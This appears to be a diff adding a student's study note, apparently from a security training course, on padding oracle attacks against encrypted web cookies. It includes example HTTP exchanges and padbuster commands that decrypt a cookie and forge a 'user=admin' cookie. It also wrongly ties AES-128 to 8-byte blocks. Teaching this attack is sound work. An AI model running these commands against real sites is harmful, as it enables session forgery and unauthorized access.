@@ -1,0 +1,68 @@
+This is an attack on encryption.
+
+# Example
+
+Let's say that after we log into a webapp like this
+
+```http
+POST /login.php HTTP/1.1
+Host: somesite.com
+Content-Type: application/x-www/form/urlencoded
+
+username=htb-stdnt&password=pass
+```
+
+And we got a cookie sent by the browser
+
+```http
+HTTP/1.1 302 Found
+Location: /index.php
+Set-Cookie: user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=
+```
+
+We can see that the cookie is encrypted and encoded to base64.
+
+When we try to enter some random value
+
+```http
+GET /index.php HTTP/1.1
+Host: somesite.com
+Cookie: user=invalidCipherText
+```
+
+The webapp throws a `500` Internal server error, and it also returns an "invalid padding" error instead of a generic "decryption failed" error.
+
+So we have a "padding oracle" (ba-dum tss). This will be a false condition, which tells us if the padding is wrong
+
+```http
+HTTP/1.1 500 Internal Server Error
+
+Invalid Padding
+```
+
+# Exploitation
+
+Install tool. Also install [Padding Oracle Hunter](https://github.com/portswigger/padding-oracle-hunter) if use burp
+
+```sh
+sudo apt install padbuster
+```
+
+There are AES 256 and 128, meaning 16 bytes or 8 bytes block. We can kinda guess it is 16 bytes by looking at the initialization vector `AAAAA...` (it's not always `A`). 
+
+So we got a cipher text: 16 bytes block size, and base64 encoding
+
+So we got this command. `16` is block size, `-encoding 0` is base64.
+
+We can also specify a false condition string like this `-error 'Invalid Padding'`
+
+
+```sh
+padbuster http://somesite.com/index.php "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" -error 'Invalid Padding'
+```
+
+We can (sometimes) also encrypt without knowing the key with `-plaintext`
+
+```sh
+padbuster http://somesite.com/index.php "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" -plaintext "user=admin" -error 'Invalid Padding'
+```
